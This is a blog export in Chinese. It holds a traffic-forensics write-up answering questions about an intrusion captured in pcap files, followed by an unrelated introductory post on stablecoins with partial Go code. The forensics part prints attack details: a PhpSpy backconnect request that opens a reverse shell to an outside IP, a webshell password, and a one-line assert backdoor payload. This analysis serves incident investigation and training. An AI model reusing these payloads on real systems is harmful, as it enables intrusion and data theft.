<h3 id="黑客给哪2个帐号发送了钓鱼邮件？（逗号隔开）"><a href="#黑客给哪2个帐号发送了钓鱼邮件？（逗号隔开）" class="headerlink" title="黑客给哪2个帐号发送了钓鱼邮件？（逗号隔开）"></a>黑客给哪2个帐号发送了钓鱼邮件？（逗号隔开）</h3><p><strong>答案</strong>: <a href="mailto:&#x69;&#x74;&#64;&#x74;&#x33;&#115;&#101;&#99;&#x2e;&#x63;&#99;">&#x69;&#x74;&#64;&#x74;&#x33;&#115;&#101;&#99;&#x2e;&#x63;&#99;</a>,<a href="mailto:&#108;&#x69;&#x78;&#x69;&#x61;&#x6f;&#x66;&#101;&#x69;&#64;&#116;&#x33;&#115;&#x65;&#x63;&#x2e;&#99;&#x63;">&#108;&#x69;&#x78;&#x69;&#x61;&#x6f;&#x66;&#101;&#x69;&#64;&#116;&#x33;&#115;&#x65;&#x63;&#x2e;&#99;&#x63;</a><br><strong>分析步骤</strong>:</p>
<ol>
<li>过滤SMTP协议(设置过滤条件为smtp)</li>
<li>发现发送方<a href="mailto:&#x78;&#x73;&#x73;&#101;&#114;&#64;&#108;&#105;&#118;&#x65;&#46;&#x63;&#x6e;">&#x78;&#x73;&#x73;&#101;&#114;&#64;&#108;&#105;&#118;&#x65;&#46;&#x63;&#x6e;</a>向这两个账号发送邮件</li>
</ol>
<p><img src="https://s2.loli.net/2025/04/28/hSvZ1GMXU4ysWoz.png" alt="4.png"></p>
<h2 id="黑客使用哪个邮件钓鱼邮件"><a href="#黑客使用哪个邮件钓鱼邮件" class="headerlink" title="黑客使用哪个邮件钓鱼邮件"></a>黑客使用哪个邮件钓鱼邮件</h2><p><strong>答案</strong>: <a href="mailto:&#120;&#x73;&#115;&#x65;&#114;&#x40;&#x6c;&#105;&#118;&#x65;&#46;&#x63;&#110;">&#120;&#x73;&#115;&#x65;&#114;&#x40;&#x6c;&#105;&#118;&#x65;&#46;&#x63;&#110;</a><br><strong>分析步骤</strong>: 思路：利用邮件协议，进行关键字过滤</p>
<p>查看FROM字段是  <a href="mailto:&#120;&#x73;&#x73;&#x65;&#x72;&#64;&#x6c;&#105;&#x76;&#101;&#46;&#x63;&#110;">&#120;&#x73;&#x73;&#x65;&#x72;&#64;&#x6c;&#105;&#x76;&#101;&#46;&#x63;&#110;</a> (return-path）</p>
<p><img src="https://s2.loli.net/2025/04/28/D6p8MZ5lQgWGYca.png" alt="5.png"></p>
<p><img src="https://s2.loli.net/2025/04/28/MiRfn1ymcsvuL2k.png" alt="6.png"></p>
<h2 id="黑客对哪个参数进行了注入并成功"><a href="#黑客对哪个参数进行了注入并成功" class="headerlink" title="黑客对哪个参数进行了注入并成功"></a>黑客对哪个参数进行了注入并成功</h2><p><strong>来源</strong>：数据采集<code>H_eth0_NS_20160809_170930.pcap</code></p>
<p><strong>答案</strong>: name<br><strong>分析步骤</strong>:</p>
<ol>
<li>过滤条件: <code>http.request.full_uri contains &quot;SELECT&quot;</code></li>
<li>发现黑客使用sqlmap对name参数注入</li>
</ol>
<p><img src="https://s2.loli.net/2025/04/28/zK9MRph6YTXkadZ.png" alt="7.png"></p>
<h3 id="账号密码的加密方式是什么？（大写）"><a href="#账号密码的加密方式是什么？（大写）" class="headerlink" title="账号密码的加密方式是什么？（大写）"></a>账号密码的加密方式是什么？（大写）</h3><p><strong>思路</strong>：搜索关键字，根据之前上传的webshell来进行推断</p>
<p><strong>来源</strong>：数据采集H_eth0_NS_20160809_170930.pcap</p>
<p><strong>答案</strong>：MD5</p>
<p><strong>解答：</strong>在数据包中发现了黑客使用sqlmap进行了注入攻击，过滤<code>http contains &quot;password&quot; </code>可以查看注入密码的请求和响应，查看其中的一个响应包(例如478036)，查看内容可以推测是使用了MD5加密（一种被广泛使用的密码<a href="https://so.csdn.net/so/search?q=%E6%95%A3%E5%88%97&spm=1001.2101.3001.7020">散列</a>函数，可以产生出一个128位（16字节）的散列值， <strong>不可逆</strong> 的加密算法，不可逆加密算法的特征是 <strong>加密过程中不需要使用密钥</strong>，位数固定）</p>
<p><img src="https://s2.loli.net/2025/04/28/ZyRaKiAPQ5MLSp2.png" alt="8.png"></p>
<h2 id="WebShell权限是什么"><a href="#WebShell权限是什么" class="headerlink" title="WebShell权限是什么"></a>WebShell权限是什么</h2><p><strong>思路</strong>：过滤关键字whoami，getshell后黑客会进行提权，会对当前的系统进行提权</p>
<p><strong>来源</strong>：数据采集H_eth0_NS_20160809_172819.pcap</p>
<p><strong>答案</strong>：apache</p>
<p><strong>解答</strong>：设置过滤条件<code>tcp contains whoami</code></p>
<p>在数据包189424中发现黑客执行命令whoami的返回包，权限为apache</p>
<p><img src="https://s2.loli.net/2025/04/28/ORxzHas5vgdC289.png" alt="9.png"></p>
<h2 id="内网数据库IP地址是多少"><a href="#内网数据库IP地址是多少" class="headerlink" title="内网数据库IP地址是多少"></a>内网数据库IP地址是多少</h2><p><strong>来源</strong>：数据采集H_eth0_NS_20160809_172819.pcap</p>
<p><strong>答案：</strong>172.16.60.195</p>
<p><strong>解答</strong>：猜测黑客通过之前的webshell连接数据库，设置过滤条件为<code>http contains &quot;20160809092842.php&quot;</code></p>
<p>在包211320中发现黑客连接数据库操作，其中ip为172.16.60.195</p>
<p><img src="https://s2.loli.net/2025/04/28/WzblYiZowNqFKSQ.png" alt="10.png"></p>
<h2 id="OA数据库用户名是什么"><a href="#OA数据库用户名是什么" class="headerlink" title="OA数据库用户名是什么"></a>OA数据库用户名是什么</h2><p><strong>答案</strong>: root<br><strong>分析步骤</strong>: 过滤<code>ip.addr==172.16.60.195 &amp;&amp; mysql</code>追踪TCP流就可以看见</p>
<p><img src="https://s2.loli.net/2025/04/28/NQ2J4Gra7wSYs5i.png" alt="11.png"></p>
<h2 id="黑客使用了哪个页面的漏洞获取了webshell-填写文件名即可"><a href="#黑客使用了哪个页面的漏洞获取了webshell-填写文件名即可" class="headerlink" title="黑客使用了哪个页面的漏洞获取了webshell(填写文件名即可)"></a>黑客使用了哪个页面的漏洞获取了webshell(填写文件名即可)</h2><ol>
<li><p>来源:数据采集D_eth0_NS_20160809_171230.pcap</p>
<p>答案：upload.php</p>
<p>解答：继续搜索webshell的文件名，设置过滤条件为http contains “20160809092842.php”</p>
<p><img src="https://s2.loli.net/2025/04/28/yHqCV9rGZuStK3X.png" alt="12.png"> </p>
<p>跟踪第一个请求的tcp流，可以看到是通过upload.php来上传的。</p>
<p>（第七排referer——ac&#x3D;upload）</p>
<p><img src="https://s2.loli.net/2025/04/28/HraJy12pfLQjSBZ.png" alt="13.png"><img src="https://s2.loli.net/2025/04/28/PbHcJylSoIjUt1O.png" alt="14.png"></p>
</li>
</ol>
<p><strong>答案</strong>: <code>/* angel 2013*/</code></p>
<h2 id="WebShell密码是多少（明文）"><a href="#WebShell密码是多少（明文）" class="headerlink" title="WebShell密码是多少（明文）"></a>WebShell密码是多少（明文）</h2><p><strong>来源：</strong>数据采集H_eth0_NS_20160809_172819.pcap</p>
<p><strong>答案：</strong>angel</p>
<p><strong>解答：</strong>设置过滤条件为<code>http contains &quot;20160809092842.php&quot;</code></p>
<p>在包169940中发现，登陆后门操作，密码为angel</p>
<p><img src="https://s2.loli.net/2025/04/28/WOH9jJdFxIQTrUY.png" alt="15.png"></p>
<h2 id="黑客下载了哪几个数据库"><a href="#黑客下载了哪几个数据库" class="headerlink" title="黑客下载了哪几个数据库"></a>黑客下载了哪几个数据库</h2><p><strong>来源</strong>：数据采集D_eth0_NS_20160809_172831.pcap</p>
<p>答案：oa.sql,crm.sql</p>
<p><strong>解答</strong>：设置过滤条件为<code>http contains &quot;.sql&quot;</code>。可以看到黑客使用了phpspy的备份数据库功能。最后在20160809这个目录下载了2个数据库备份文件</p>
<p><img src="https://s2.loli.net/2025/04/28/cJn264YfZWtkFwQ.png" alt="16.png"></p>
<h2 id="黑客遗漏的后门是如何编写最短代码来执行phpinfo的"><a href="#黑客遗漏的后门是如何编写最短代码来执行phpinfo的" class="headerlink" title="黑客遗漏的后门是如何编写最短代码来执行phpinfo的"></a>黑客遗漏的后门是如何编写最短代码来执行phpinfo的</h2><p><strong>来源</strong>：数据采集H_eth0_NS_20160809_172819.pcap</p>
<p><strong>答案</strong>：a&#x3D;assert&amp;b&#x3D;phpinfo()</p>
<p><strong>解答</strong>：设置过滤条件为<code>http contains &quot;20160809092842.php&quot;</code>。在278800包中发现一句话后门内容</p>
<p>(后门：隐藏通道；</p>
<p><img src="https://s2.loli.net/2025/04/28/VXi8TZI1UmMJYhp.png" alt="17.png"></p>
<p>这个后门接受两个参数，a作为函数名，b作为执行的参数</p>
<p><img src="https://s2.loli.net/2025/04/28/RZScd9xHw2PDsG1.png" alt="18.png"></p>
<h2 id="黑客对哪些email进行了爆破"><a href="#黑客对哪些email进行了爆破" class="headerlink" title="黑客对哪些email进行了爆破"></a>黑客对哪些email进行了爆破</h2><p><strong>来源</strong>：数据采集D_eth0_NS_20160809_164452.pcap</p>
<p><strong>答案</strong>：<a href="mailto:&#105;&#116;&#64;&#116;&#x33;&#115;&#101;&#x63;&#x2e;&#99;&#x63;">&#105;&#116;&#64;&#116;&#x33;&#115;&#101;&#x63;&#x2e;&#99;&#x63;</a></p>
<p><strong>解答</strong>：过滤黑客的ip和mail关键字 尝试查找和email爆破相关的信息</p>
<p>设置过滤条件为<code>ip.addr eq 183.129.152.140 and http contains &quot;mail&quot;</code></p>
<p>在前半部分可以发现很多的登陆请求，仔细查看后这些包属于扫描器对目标的随机测试。</p>
<p><img src="https://s2.loli.net/2025/04/28/Piz39DkoIURNqHe.png" alt="19.png"></p>
<p><img src="https://s2.loli.net/2025/04/28/eCcqQUtGifID6kJ.png" alt="20.png"></p>
<h2 id="黑客向哪个ip反弹了一个shell"><a href="#黑客向哪个ip反弹了一个shell" class="headerlink" title="黑客向哪个ip反弹了一个shell"></a>黑客向哪个ip反弹了一个shell</h2><p><strong>来源</strong>：数据采集H_eth0_NS_20160809_172819.pcap</p>
<p><strong>答案</strong>：118.193.179.201</p>
<p><strong>解答</strong>：设置过滤条件为<code>http contains &quot;20160809092842.php&quot;</code></p>
<p>在372776包中发现黑客通过webshell发起了一个反弹shell的指令，ip为118.193.179.201</p>
<p><img src="https://s2.loli.net/2025/04/28/f5HSCpVZmUqXLar.png" alt="21.png"></p>
<h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>在PhpSpy大马中有backconnect反弹功能。搜索使用这个功能的地方，在D172831中第264063个包中找到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/data/uploadfile/1/20160809/20160809092842.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: oa.t3sec.cc:8082</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://oa.t3sec.cc:8082/data/uploadfile/1/20160809/20160809092842.php</span><br><span class="line"></span><br><span class="line">Cookie: my_expand_3=2%2C1%2C; PHPSESSID=lq5vn8k9fe72pnsffjv35ljj71; po_auth=MQkwOWZiY2U0NjU1NDEwYmMwM2JhZmExZDExZjc2ODQ3NQ%3D%3D; loginpass=ec38fe2a8497e0a8d6d349b3533038cb</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">Content-Length: 95</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">act=backconnect&amp;cwd=%2Fvar%2Fwww%2Fhtml%2F&amp;p1=start&amp;p2=118.193.179.201&amp;p3=9090&amp;p4=c&amp;charset=gbk</span><br></pre></td></tr></table></figure>

<p>前面的TCP流中，可以找到这个功能的WEB界面：</p>
<p><img src="https://s2.loli.net/2025/04/28/xznbTZ7thYB1sqi.png" alt="22.png"></p>
<p>还有其他网站也能找到：</p>
<p><img src="https://s2.loli.net/2025/04/28/NbtCOfhpTdnFrem.png" alt="23.png"></p>
<p>同样，到处html查看信息得到ip和端口</p>
<p><img src="https://s2.loli.net/2025/04/28/b4Yx15nNfBWaU8w.png" alt="24.png"></p>
<h2 id="黑客预留的后门文件名是什么"><a href="#黑客预留的后门文件名是什么" class="headerlink" title="黑客预留的后门文件名是什么"></a>黑客预留的后门文件名是什么</h2><p><strong>来源</strong>：数据采集H_eth0_NS_20160809_172819.pcap</p>
<p><strong>答案</strong>：admin.bak.php</p>
<p><strong>解答</strong>：设置过滤条件为<code>http contains &quot;20160809092842.php&quot;</code></p>
<p>在278800包中发现一句话后门内容</p>
<p><img src="https://s2.loli.net/2025/04/28/TodI4mYlDtUBL1x.png" alt="25.png"></p>
<p>可以看到后门的文件名为admin.bak.php</p>
]]></content>
      <tags>
        <tag>传统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>稳定币</title>
    <url>/2025/07/01/%E7%A8%B3%E5%AE%9A%E5%B8%81%EF%BC%88Stablecoin%EF%BC%89%EF%BC%9A%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E6%97%B6%E4%BB%A3%E7%9A%84%E4%BB%B7%E5%80%BC%E9%94%9A/</url>
    <content><![CDATA[<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;"></font></p>
<h2 id="启程：走近稳定币世界"><a href="#启程：走近稳定币世界" class="headerlink" title="启程：走近稳定币世界"></a><font style="color:#000000;">启程：走近稳定币世界</font></h2><p>2024年7月，香港金管局公布首批三家”沙盒”参与机构，京东数科旗下公司等入选。2025年5月，香港立法会通过《稳定币条例草案》，飞速进步和不断跨越，标志着我国在稳定币监管领域取得重要突破。</p>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/A7kkPn9byBu82eeaRCmMLg">稳定币成功的关键是什么</a></p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750001936684-79af4ebe-7689-4577-b081-930603d0a937.png"></p>
<p><font style="color:#000000;">的确，在数字经济高速发展的今天，虚拟资产逐渐走入大众视野。但价格的剧烈波动却限制了它们在实际支付、跨境结算、金融产品等领域的应用。</font></p>
<p><font style="color:#000000;">尤其是在电商领域，京东这样的大型平台也在探索区块链技术的落地，但受限于数字货币的不稳定性，其在支付链路中的使用仍面临诸多挑战。 正是在这种背景下，稳定币（Stablecoin）应运而生，</font><strong><font style="color:#000000;">成为连接传统金融与区块链世界的重要桥梁</font></strong><font style="color:#000000;">。</font></p>
<p><font style="color:#000000;"></font></p>
<p><font style="color:#000000;"></font></p>
<h2 id="初识：稳定币到底是什么？"><a href="#初识：稳定币到底是什么？" class="headerlink" title=" 初识：稳定币到底是什么？"></a><font style="color:#000000;"> </font><font style="color:#000000;">初识：稳定币到底是什么？</font></h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><font style="color:#000000;">定义</font></h3><p><font style="color:#000000;">在理想状态下，</font><strong><font style="color:#000000;">稳定币是一种价值稳定的加密货币</font></strong><font style="color:#000000;">。</font></p>
<p><font style="color:#000000;">它继承了比特币所有的核心优势——如</font><strong><font style="color:#000000;">去中心化</font></strong><font style="color:#000000;">、</font><strong><font style="color:#000000;">安全性</font></strong><font style="color:#000000;">和</font><strong><font style="color:#000000;">全球流通性</font></strong><font style="color:#000000;">，同时避免了价格剧烈波动的缺点。这种特性使稳定币更适合承担货币的三大职能：</font><strong><font style="color:#000000;">可靠的价值储存手段、高效的交易媒介</font></strong><font style="color:#000000;">以及</font><strong><font style="color:#000000;">稳定的计价单位</font></strong><font style="color:#000000;">。</font></p>
<p><font style="color:#000000;">稳定币通常锚定某种现实世界货币，如“1枚稳定币 ≈ 1美元”。但他不是现实发售的货币，而是运行在链上的虚拟货币。</font></p>
<p><font style="color:#000000;">同时它也不是凭空出现的资产，而是依靠技术可信“发行”的数字货币。这些与美元1:1锚定的数字货币能够有效规避市场波动风险。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750174908963-bda1624c-e887-4228-abf6-e4dcfe17e9e2.png"></p>
<p><font style="color:#000000;">在数字货币交易中，稳定币扮演着重要的桥梁角色。</font><strong><font style="color:#000000;">用户通常会先在交易所（功能类似于传统银行）用法币（如人民币）购买稳定币（如USDT），完成这一兑换后，用户便可利用持有的稳定币自由地交易比特币等其他加密货币。</font></strong></p>
<p><font style="color:#000000;">这种”法币→稳定币→加密货币”的三段式操作流程，不仅降低了汇率波动带来的资产风险，也为投资者提供了更灵活的资金管理方式，已成为当前数字货币交易市场的标准操作范式。</font></p>
<blockquote>
<p><font style="color:#000000;">或者我们可以想像加密货币交易市场是一个大“赌场”，我们可以在这个“赌场”进行下注，预测币价的上涨或下跌，而稳定币便是我们手中的筹码。</font></p>
</blockquote>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a><font style="color:#000000;">特点</font></h3><p><font style="color:#000000;">稳定币有如下6个特点：</font></p>
<ol>
<li><strong><font style="color:#000000;">价格稳定性</font></strong><font style="color:#000000;">：通过</font><strong><font style="color:#000000;">锚定资产、算法调控或混合机制</font></strong><font style="color:#000000;">，稳定币能有效控制价格波动。</font></li>
<li><strong><font style="color:#000000;">高流动性</font></strong><font style="color:#000000;">：既可在链上自由转移，也</font><strong><font style="color:#000000;">能快速兑换</font></strong><font style="color:#000000;">为法币或其他加密资产。</font></li>
</ol>
<blockquote>
<p><font style="color:#000000;">流动性高的主要原因是因为法币兑换渠道成熟，交易所、OTC平台、支付网关均提供即时兑换服务。譬如用户A在以太坊链上持有USDT（最常见的稳定币之一），可以直接通过钱包转账给用户B（跨境支付或交易），几分钟内完成，手续费极低（相比银行转账）。</font></p>
</blockquote>
<ol start="3">
<li><strong><font style="color:#000000;">透明性与可审计性</font></strong><font style="color:#000000;">：大多数稳定币项目通常提供</font><strong><font style="color:#000000;">链上数据或链下储备证明（Proof-of-Reserves）</font></strong><font style="color:#000000;">定期披露储备证明，并接受审计。</font></li>
<li><strong><font style="color:#000000;">去中心化与合规性兼容</font></strong><font style="color:#000000;">：不同类型的稳定币在去中心化程度与合规要求之间寻找平衡。</font></li>
<li><strong><font style="color:#000000;">链上发行、可编程性</font></strong><font style="color:#000000;">：多数稳定币通过智能合约部署在以太坊（如USDC、DAI）、Tron（如USDT-TRC20）等公链上，具备可编程金融属性。</font></li>
</ol>
<blockquote>
<p><font style="color:#000000;">可编程金融属性（Programmable Finance）指的是通过智能合约（Smart Contracts）和去中心化协议，将传统金融的逻辑、规则和流程以代码的形式嵌入区块链网络，从而实现金融业务的自动化、透明化和无需信任化</font></p>
</blockquote>
<p><font style="color:#000000;"></font></p>
<ol start="6">
<li><strong><font style="color:#000000;">合约自动清算机制：</font></strong><font style="color:#000000;">抵押型稳定币和算法型稳定币通过</font><strong><font style="color:#000000;">链上合约</font></strong><font style="color:#000000;">实现清算、增发、赎回等功能。</font></li>
</ol>
<blockquote>
<p>下文“稳定币的底层原理”部分有关于的维持平衡（稳定性），<font style="color:#000000;">抵押型稳定币和算法型稳定币的详细说明</font></p>
</blockquote>
<p><font style="color:#000000;"></font></p>
<h2 id="乱世求稳：稳定币的”进化之路”"><a href="#乱世求稳：稳定币的”进化之路”" class="headerlink" title="乱世求稳：稳定币的”进化之路”"></a><font style="color:#000000;">乱世求稳：稳定币的”进化之路”</font></h2><p>稳定币的起源可以追溯到2014年，当时 Tether 公司率先发行了广为人知的 USDT （泰达币），成为首个与美元1:1锚定的数字货币。 <font style="color:rgb(25, 27, 31);">USDT 的发行标志着稳定币市场的开端，随后其他稳定币也开始涌现，逐渐成为加密货币市场中不可或缺的工具。</font></p>
<p>2018年，由于 Tether 公司未能及时公开审计报告，引发市场信任危机，导致 USDT 价格剧烈震荡。其中，2018年8月6日，USDT 兑美元汇率一度跌至0.94美元的历史低点。但随着市场恐慌情绪缓解，抛售压力减弱，USDT 价格逐步回升并恢复稳定。</p>
<p>到了2020年，全球稳定币的总市值仅为200亿美元，反映着当时这一领域仍处于早期发展阶段，市场潜力尚未完全释放。</p>
<p>但<font style="color:rgb(25, 27, 31);">自2020年起，稳定币市场进入了高速增长阶段。</font></p>
<p><font style="color:rgb(25, 27, 31);">到2025年5月，全球稳定币市值已经飙升至2500亿美元，五年间实现了惊人的11倍增长。这一扩张速度远远超过传统金融工具，稳定币从边缘创新迅速蜕变为金融基础设施的核心支柱。</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750060703780-0027155b-c40a-4277-a071-4d3a7f860414.png" alt="过去几年稳定币规模"></p>
<h2 id="核心秘密：稳定币是如何“炼”成的？"><a href="#核心秘密：稳定币是如何“炼”成的？" class="headerlink" title="核心秘密：稳定币是如何“炼”成的？"></a><font style="color:#000000;">核心秘密：稳定币是如何“炼”成的？</font></h2><p><font style="color:#000000;">稳定币的稳定性，得益于区块链技术的底层支撑。</font></p>
<p><font style="color:#000000;">稳定币的每一个操作和记录</font><strong><font style="color:#000000;">都可以在链上溯源，公开透明，这也提高其透明性，可审计性，也能减少交易时间与成本，更快速且更便宜地达成交易。   </font></strong></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57044047/1750042588587-c1b38631-ddeb-40df-8908-2d6b713ad217.png" alt="区块链的架构示例图"></p>
<h3 id="稳定币如何“稳定”"><a href="#稳定币如何“稳定”" class="headerlink" title="稳定币如何“稳定”"></a><font style="color:#000000;">稳定币如何“稳定”</font></h3><p><font style="color:#000000;">稳定币通过将其价格与某种稳定的资产挂钩来实现其稳定性，例如美元、黄金或其他加密货币。常见的稳定币类型</font><strong><font style="color:#000000;">包括法币抵押型、加密资产抵押型以及算法调节型。</font></strong></p>
<font style="color:#000000;">  

<h4 id="1-法币抵押型稳定币（最常见）"><a href="#1-法币抵押型稳定币（最常见）" class="headerlink" title="1. 法币抵押型稳定币（最常见）"></a></font><font style="color:#000000;">1.</font><strong><font style="color:#000000;"> 法币抵押型稳定币</font></strong><font style="color:#000000;">（最常见）</h4><p></font><strong><font style="color:#000000;">原理</font></strong><font style="color:#000000;">：这类稳定币就像我们银行账户里的数字美元（或数字人民币）。发行方在银行里存了真实的美元，然后按 1:1 的比例发行对应数量的稳定币。比如，你给我 1 美元，我就给你 1 个稳定币；你把 1 个稳定币还给我，我就退你 1 美元。<br></font><strong><font style="color:#000000;">例子</font></strong><font style="color:#000000;">：USDT (泰达币) 和 USDC (美元币) 就是最常用的两种，它们都宣称自己有等值的美元储备。<br></font><strong><font style="color:#000000;">优点</font></strong><font style="color:#000000;">：最简单，最稳定，被广泛接受。<br></font><strong><font style="color:#000000;">缺点</font></strong><font style="color:#000000;">：用户需自主判断发行方的信任证明机制，避免超额发行或挪用风险。</font></p>
<font style="color:#000000;">  

<h4 id="2-加密货币抵押型稳定币"><a href="#2-加密货币抵押型稳定币" class="headerlink" title="2. 加密货币抵押型稳定币"></a></font><font style="color:#000000;">2. </font><strong><font style="color:#000000;">加密货币抵押型稳定币</font></strong><font style="color:#000000;"></h4><p></font><strong><font style="color:#000000;">原理</font></strong><font style="color:#000000;">：这种稳定币没有人来存美元，而是通过抵押其他加密货币来发行。比如，你想生成 100 美元的稳定币，你可能需要抵押 150 美元的以太坊。之所以要多抵押一些，是为了防止以太坊价格下跌时，你的抵押物不够用。（一定要超额抵押）<br></font><strong><font style="color:#000000;">例子</font></strong><font style="color:#000000;">：DAI (代币)<br></font><strong><font style="color:#000000;">优点</font></strong><font style="color:#000000;">：更去中心化，不依赖某个公司。<br></font><strong><font style="color:#000000;">缺点</font></strong><font style="color:#000000;">：机制复杂一些，而且如果抵押的加密货币价格暴跌，也有风险。</font></p>
<font style="color:#000000;">





<h4 id="3-算法稳定币（风险较高，一般不推荐新手触碰）"><a href="#3-算法稳定币（风险较高，一般不推荐新手触碰）" class="headerlink" title="3. 算法稳定币（风险较高，一般不推荐新手触碰）"></a></font><font style="color:#000000;">3. </font><strong><font style="color:#000000;">算法稳定币</font></strong><font style="color:#000000;">（风险较高，一般不推荐新手触碰）</h4><p></font><strong><font style="color:#000000;">原理</font></strong><font style="color:#000000;">：这种稳定币不靠任何抵押物，而是靠一套智能合约算法来调节供应量，以维持价格稳定。当稳定币价格高了，算法就多发行一些；价格低了，算法就回收一些。<br></font><strong><font style="color:#000000;">例子</font></strong><font style="color:#000000;">：曾经的 UST 就是一个算法稳定币，但后来崩盘了，导致很多人亏钱。<br></font><strong><font style="color:#000000;">优点</font></strong><font style="color:#000000;">：理论上最去中心化，但实际操作中风险非常大。<br></font><strong><font style="color:#000000;">缺点</font></strong><font style="color:#000000;">：极其脆弱，一旦市场恐慌或算法失灵，很容易彻底崩溃。</font><font style="color:rgb(38, 38, 38);">  </p>
</font>

<p> 基于算法的稳定币AMPL的Rebase（弹性供应）机制，其核心是通过自动调整供应量来维持1 AMPL ≈ 1美元的稳定性。具体分为以下两种情况：</p>
<ol>
<li><p><strong>当价格高于1美元时（如1 AMPL &#x3D; 2美元）</strong>  </p>
<ul>
<li>系统会<strong>增发</strong>AMPL给持有者（例如原持有1 AMPL变为2 AMPL）。  </li>
<li>增发后，单个AMPL的价值回落至1美元（图中“2 AMPL &#x3D; $2，每个价值1美元”）。  </li>
<li>这一过程吸引更多买家（DEMAND），推动需求增长（&gt;$1009可能指市值或交易量）。</li>
</ul>
</li>
<li><p><strong>当价格低于1美元时（如1 AMPL &#x3D; 0.5美元）</strong>  </p>
<ul>
<li>系统会<strong>收缩</strong>供应量，持有者的AMPL数量减少（例如原持有1 AMPL变为0.5 AMPL）。  </li>
<li>收缩后，单个AMPL的价值回升至1美元（图中“0.5 AMPL &#x3D; $0.5”）。  </li>
<li>价格下跌会抑制需求（&lt;$1009）。</li>
</ul>
</li>
</ol>
<p><strong>总结</strong>：AMPL通过Rebase机制动态调整供应量，利用市场供需关系将价格锚定1美元，无需抵押资产，完全依赖算法调控。</p>
<p><font style="color:#000000;"></font></p>
<h3 id="原理的代码实现举例"><a href="#原理的代码实现举例" class="headerlink" title="原理的代码实现举例"></a><font style="color:#000000;">原理的代码实现举例</font></h3><h4 id="GO语言实现（法币储备型稳定币模拟系统）："><a href="#GO语言实现（法币储备型稳定币模拟系统）：" class="headerlink" title="GO语言实现（法币储备型稳定币模拟系统）："></a><strong><font style="color:#000000;">GO语言实现</font></strong><font style="color:#000000;">（</font><strong><font style="color:#000000;">法币储备型稳定币模拟系统</font></strong><font style="color:#000000;">）：</font></h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;errors&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Stablecoin <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name        <span class="type">string</span></span><br><span class="line">    Symbol      <span class="type">string</span></span><br><span class="line">    TotalSupply <span class="type">uint64</span></span><br><span class="line">    MaxSupply   <span class="type">uint64</span></span><br><span class="line">    Owner       <span class="type">string</span></span><br><span class="line">    Balances    <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">uint64</span></span><br><span class="line">    mu          sync.Mutex</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建新稳定币实例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewStablecoin</span><span class="params">(name, symbol, owner <span class="type">string</span>, initialSupply, maxSupply <span class="type">uint64</span>)</span></span> *Stablecoin &#123;</span><br><span class="line">    sc := &amp;Stablecoin&#123;</span><br><span class="line">        Name:        name,</span><br><span class="line">        Symbol:      symbol,</span><br><span class="line">        Owner:       owner,</span><br><span class="line">        TotalSupply: <span class="number">0</span>,</span><br><span class="line">        MaxSupply:   maxSupply,</span><br><span class="line">        Balances:    <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">uint64</span>),</span><br><span class="line">    &#125;</span><br><span class="line">    sc.mint(owner, initialSupply) <span class="comment">// 初始化分配</span></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 仅管理员可以调用的铸币函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sc *Stablecoin)</span></span> mint(to <span class="type">string</span>, amount <span class="type">uint64</span>) <span class="type">error</span> &#123;</span><br><span class="line">    sc.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> sc.mu.Unlock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sc.TotalSupply+amount &gt; sc.MaxSupply &#123;</span><br><span class="line">        <span class="keyword">return</span> errors.New(<span class="string">&quot;max supply exceeded&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    sc.Balances[to] += amount</span><br><span class="line">    sc.TotalSupply += amount</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁稳定币（如用户赎回）</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(sc *Stablecoin)</span></span> burn(from <span class="type">string</span>, amount <span class="type">uint64</span>) <span class="type">error</span> &#123;</span><br><span class="line">    sc.mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> sc.mu.Unlock()</span><br><span 